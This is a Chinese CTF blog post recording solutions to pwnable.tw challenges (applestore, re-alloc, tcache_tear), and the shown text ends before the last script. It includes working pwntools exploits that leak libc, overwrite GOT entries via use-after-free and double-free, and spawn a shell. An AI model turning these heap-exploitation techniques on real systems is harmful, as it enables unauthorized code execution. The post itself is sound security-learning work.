<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="pwnable.tw刷题记录">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnable.tw刷题记录">
<meta property="og:url" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="ABf1ag&#39;s blog">
<meta property="og:description" content="pwnable.tw刷题记录">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021223113162.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021224313910.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211022154110982.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211025191339484.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204705480.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204945871.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026205228948.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026210706201.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027214805158.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027215049499.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027221010581.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028194544373.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028203053901.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ABf1ag-blog/source_posts/pwnable-tw刷题记录/image-20211103201504616.png">
<meta property="og:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108110017579.png">
<meta property="article:published_time" content="2021-10-21T13:56:20.000Z">
<meta property="article:modified_time" content="2021-11-23T09:09:50.305Z">
<meta property="article:author" content="ABf1ag">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021223113162.png">

<link rel="canonical" href="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>pwnable.tw刷题记录 | ABf1ag's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ABf1ag's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section">Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section">Archives</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section">links</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ABf1ag">
      <meta itemprop="description" content="CTF to learn,not learn to CTF">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ABf1ag's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pwnable.tw刷题记录
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-10-21 21:56:20" itemprop="dateCreated datePublished" datetime="2021-10-21T21:56:20+08:00">2021-10-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-11-23 17:09:50" itemprop="dateModified" datetime="2021-11-23T17:09:50+08:00">2021-11-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="pwnable-tw刷题记录"><a href="#pwnable-tw刷题记录" class="headerlink" title="pwnable.tw刷题记录"></a>pwnable.tw刷题记录</h2><span id="more"></span>

<h3 id="1-applestore-假unlink劫持ebp"><a href="#1-applestore-假unlink劫持ebp" class="headerlink" title="1.applestore(假unlink劫持ebp)"></a>1.applestore(假unlink劫持ebp)</h3><p>这个题实现了一个双向列表的插入和删除操作，实话实说这个题是真的绕。</p>
<p>这个题的漏洞在于栈的地址被写入到了堆上，且栈的区域可控。如下图所示，并没有申请一个堆块而是直接利用栈中的区域作为堆块被插入到了链表中。（后面都将这块栈区域命名为v2）</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021223113162.png" alt="image-20211021223113162"></p>
<p>又因为当checkout函数执行结束后会释放掉栈帧，其他和他同级的函数被调用时重复使用到其栈帧，所以说我们可以控制这一块栈区域。</p>
<p>因为v2距离ebp的距离为0x20。且其同级函数cart()或dele()他们的buf变量也距离ebp为0x20，所以我们可以通过写入这两个函数的buf变量来改变被插入链表中的v2的值。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021224313910.png" alt="image-20211021224313910"></p>
<p>可以看见buf是my_read函数的参数，因此我们可以利用my_read函数来修改v2的fd指针和bk指针。到这里后我原本的思路是将fd指针写入system的地址，bk指针写入atoi_got-8的地址。但是发现system地址并不在可写段上，所以在进行dele操作时会报错。</p>
<p>dele操作如下图所示，先找到要删除的chunk（victim）的bk指针所指向的bck，也就是<code>bck=victim-&gt;bk</code>,然后<code>bck-&gt;fd=victim-&gt;fd</code>,接着<code>victim-&gt;fd-&gt;bk=bck</code>这样victim就脱离了双向列表。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211022154110982.png" alt="image-20211022154110982"></p>
<p>报错后，就傻了，想不到绕过的方法了，看了别人的wp后我只能说绝！</p>
<p>思路就是劫持ebp，使ebp的值变为atoi_got+0x22这样当执行dele操作时，buf变量的位置就会变为ebp-0x22也就是atoi_got+0x22-0x22，因此就可以改写atoi的got表。</p>
<p>完整exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./applestore&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27;, 10104)</span><br><span class="line">elf=ELF(&#x27;./applestore&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc_32.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&#x27;read&#x27;]</span><br><span class="line">atoi_plt=elf.plt[&#x27;atoi&#x27;]</span><br><span class="line">atoi_got=elf.got[&#x27;atoi&#x27;]</span><br><span class="line"></span><br><span class="line">def ls():</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">def add(num):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Number&gt; &#x27;,str(num))</span><br><span class="line">	</span><br><span class="line">def dele(num):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Item Number&gt; &#x27;,num)</span><br><span class="line"></span><br><span class="line">def cart(context):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">	io.sendafter(&#x27;ok? (y/n) &gt; &#x27;,context)</span><br><span class="line">	</span><br><span class="line">def checkout():</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;ok? (y/n) &gt; &#x27;,&#x27;y&#x27;)</span><br><span class="line">	</span><br><span class="line">def exp():</span><br><span class="line">	for i in range(6):</span><br><span class="line">		add(1)</span><br><span class="line">	for i in range(20):</span><br><span class="line">		add(2)</span><br><span class="line">	</span><br><span class="line">	checkout()</span><br><span class="line">	cart(&#x27;y&#x27;+&#x27;\x00&#x27;+p32(read_got)+p32(1)+p32(0))</span><br><span class="line">	read=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">	libc_base=read-libc.symbols[&#x27;read&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	system=libc.symbols[&#x27;system&#x27;]+libc_base</span><br><span class="line">	environ=libc.symbols[&#x27;_environ&#x27;]+libc_base</span><br><span class="line">	cart(&#x27;y\x00&#x27;+p32(environ)+p32(1)+p32(0))</span><br><span class="line">	io.recvuntil(&#x27;27: &#x27;)</span><br><span class="line">	stack=u32(io.recv(4))-0x104-8</span><br><span class="line">	print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line">		</span><br><span class="line">	#gdb.attach(io)	</span><br><span class="line">	dele(&#x27;27\x00\x00\x00\x00&#x27;+p32(1)+p32(atoi_got+0x22)+p32(stack))                       </span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,p32(system)+&#x27;;/bin/sh\x00&#x27;)</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>在这里还有一个小知识点就是atoi()不会识别\x00之后的字符。</p>
<h3 id="2-re-alloc-realloc的妙用"><a href="#2-re-alloc-realloc的妙用" class="headerlink" title="2.re-alloc(realloc的妙用)"></a>2.re-alloc(realloc的妙用)</h3><p>首先我们回顾一下realloc函数的用法：</p>
<p>realloc 函数可以身兼 malloc 和 free 两个函数的功能 .。</p>
<ul>
<li>当realloc(ptr,size)的size不等于ptr的size时<ul>
<li>如果申请size&gt;原来size<ul>
<li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li>
<li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size)</li>
</ul>
</li>
<li>如果申请size&lt;原来size<ul>
<li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li>
<li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>当realloc(ptr,size)的size等于0时，相当于free(ptr)，且返回0。</li>
<li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li>
</ul>
<p>这个题的漏洞点就在于当我们输入size为0的时候，chunk被free掉，但由于有<code>if（！v3）</code>这个判断，所以堆指针并不会被置0，即存在uaf漏洞。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211025191339484.png" alt="image-20211025191339484"></p>
<p>因为是libc-2.29版本，所以有tcache，可以直接将chunk释放掉后更改atoll函数的got表。在这里我们将其改为printf函数的plt地址，这样就会造成一个格式化字符串漏洞，我们可以利用其来泄露出libc_base，并且printf的返回值是他打印出的字符数，就可以控制index了。最后将atoll的got表改为system函数的地址即可。</p>
<p>因为将atoll的got表改为printf的plt地址后，只能操作index=1的chunk，并且只能申请0x20大小的chunk，因此为了方便我们需要在最开始将tcache的0x20大小的位置布置好为atoll的got地址，这样泄露出地址后才能直接申请0x20大小的chunk改其got表，拿到shell。</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./re-alloc&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10106)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">elf=ELF(&#x27;./re-alloc&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">heap=0x4040b0</span><br><span class="line">atoll_got=elf.got[&#x27;atoll&#x27;]</span><br><span class="line">printf_plt=elf.plt[&#x27;printf&#x27;]</span><br><span class="line">printf_got=elf.got[&#x27;printf&#x27;]</span><br><span class="line"></span><br><span class="line">def add(index,size,context):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">	io.sendafter(&#x27;Data:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def readd(index,size,context):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">	io.sendafter(&#x27;Data:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def redele(index,size):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">	add(0,0x10,&#x27;a&#x27;)</span><br><span class="line">	redele(0,0)</span><br><span class="line">	readd(0,0x10,p64(atoll_got))</span><br><span class="line">	add(1,0x10,&#x27;b&#x27;*0x10)</span><br><span class="line">	readd(0,0x20,&#x27;c&#x27;*0x10)</span><br><span class="line">	dele(0)</span><br><span class="line">	readd(1,0x20,&#x27;d&#x27;*0x10)</span><br><span class="line">	dele(1)</span><br><span class="line">	</span><br><span class="line">	add(0,0x68,&#x27;a&#x27;)</span><br><span class="line">	add(1,0x68,&#x27;a&#x27;)</span><br><span class="line">	dele(0)</span><br><span class="line">	redele(1,0)</span><br><span class="line">	readd(1,0x68,p64(atoll_got))</span><br><span class="line">	add(0,0x68,&#x27;a&#x27;*0x68)</span><br><span class="line">	readd(0,0x78,&#x27;b&#x27;*0x60)</span><br><span class="line">	dele(0)</span><br><span class="line">	readd(1,0x68,&#x27;\x00&#x27;*0x10)</span><br><span class="line">	add(0,0x68,p64(printf_plt))</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index:&#x27;,&#x27;1\x00&#x27;)</span><br><span class="line">	</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index:&#x27;,&#x27;%21$p&#x27;)</span><br><span class="line">	libc_start_main=int(io.recv(14),16)-235</span><br><span class="line">	libc_base=libc_start_main-libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">	atoll=libc_base+libc.symbols[&#x27;atoll&#x27;]</span><br><span class="line"></span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Index:&#x27;,&#x27;a\x00&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Size:&#x27;,&#x27;a&#x27;*0x10)</span><br><span class="line">	io.sendafter(&#x27;Data:&#x27;,p64(system))</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Index:&#x27;,&#x27;/bin/sh\x00&#x27;)	</span><br><span class="line">	io.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="3-tcache-tear-fakechunk构造需要连续三个"><a href="#3-tcache-tear-fakechunk构造需要连续三个" class="headerlink" title="3.tcache_tear(fakechunk构造需要连续三个)"></a>3.tcache_tear(fakechunk构造需要连续三个)</h3><p>这个题有两个漏洞点，一个在free后指针没有置0，另一个在申请一个后，对堆进行写操作时有<code>size-16</code>,只要size小于16就会造成堆溢出。在做题的时候我只用到了第一个漏洞。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204705480.png" alt="image-20211026204705480"></p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204945871.png" alt="image-20211026204945871"></p>
<p>因为是libc-2.27-3ubuntu1，并没有打补丁，所以tcache并不会检查doublefree，所以我们先申请一个chunk然后free两次，在申请一个相同大小的chunk，就可以控制freechunk中的fd指针。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026205228948.png" alt="image-20211026205228948"></p>
<p>我们发现show操作只能输出bss段上的值，所以我们要将堆块申请到bss段上。我们先输入name为<code>p64(0)+p64(0x421)</code>先构造出chunk头。接着将freechunk的fd指针指向bss+0x10（因为tcache指向chunk+0x10）。因为我们是要准备free掉这个0x420大小的chunk，所以必须得在他下面写入<code>p64(0)+p64(0x21)</code>,然后在free，但这时候却报错了，错误提示如下：</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026210706201.png" alt="image-20211026210706201"></p>
<p>查看源码发现会检查nextchunk的下一个chunk的inuse位，如果为0则会向前合并，并且调用unlink函数，而libc-2.27相对于libc-2.23来说增加了<code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))</code>对prevsize的检查。所以我们必须在nextchunk下也写入<code>p64(0)+p64(0x21)</code>这样大小为0x420的chunk才能被放入unsortedbin中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    /* consolidate backward */</span><br><span class="line">    if (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      /* get and clear inuse bit */</span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      /* consolidate forward */</span><br><span class="line">      if (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; else</span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	/* Take a chunk off a bin list */</span><br><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);			      \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">      malloc_printerr (&quot;corrupted double-linked list&quot;);			      \</span><br><span class="line">    else &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        if (!in_smallbin_range (chunksize_nomask (P))			      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span><br><span class="line">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">	      malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);   \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;				      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                else &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; else &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就能泄露libc的基地址了，打free_hook拿shell</p>
<p>exp：</p>
